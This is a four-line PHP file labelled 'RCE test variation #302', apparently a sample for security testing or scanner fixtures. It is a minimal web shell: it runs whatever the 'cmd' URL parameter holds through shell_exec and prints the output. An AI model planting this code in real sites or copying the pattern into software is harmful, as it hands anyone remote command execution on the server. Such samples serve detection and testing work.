<?php
// RCE test variation #302
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>